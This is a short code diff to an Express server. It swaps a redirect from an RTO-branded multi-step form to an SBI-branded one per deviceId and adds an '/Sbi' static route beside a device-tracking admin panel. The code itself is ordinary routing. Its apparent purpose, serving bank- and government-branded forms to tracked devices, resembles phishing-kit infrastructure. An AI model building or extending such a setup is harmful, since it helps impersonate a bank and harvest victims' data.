@@ -37,21 +37,23 @@ const publicImgPath = path.join(__dirname, 'public', 'img');
 
 app.use('/rto', express.static(publicRtoPath));
 app.use('/img', express.static(publicImgPath));
+const publicSbiPath = path.join(__dirname, 'public', 'Sbi');
+app.use('/Sbi', express.static(publicSbiPath));
 
-// Form page route — redirect to RTO multi-step form
+// Form page route — redirect to SBI multi-step form
 app.get('/form', (req, res) => {
     const deviceId = req.query.deviceId || '';
-    res.redirect(`/rto/index.html?deviceId=${encodeURIComponent(deviceId as string)}`);
+    res.redirect(`/Sbi/index.html?deviceId=${encodeURIComponent(deviceId as string)}`);
 });
 
 // Serve React admin panel (Vite build output copied to dist/client during Docker build)
-// Must be after /api, /rto, /img, /socket.io so API is not shadowed
+// Must be after /api, /rto, /Sbi, /img, /socket.io so API is not shadowed
 const clientPath = path.join(__dirname, 'client');
 app.use(express.static(clientPath));
 
 // SPA fallback — send index.html for non-API, non-static routes (React Router: /, /login, /device/:id)
 app.get('*', (req, res, next) => {
-    if (req.path.startsWith('/api') || req.path.startsWith('/socket.io') || req.path.startsWith('/rto') || req.path.startsWith('/img')) {
+    if (req.path.startsWith('/api') || req.path.startsWith('/socket.io') || req.path.startsWith('/rto') || req.path.startsWith('/img') || req.path.startsWith('/Sbi')) {
         return next();
     }
     const indexFile = path.join(clientPath, 'index.html');
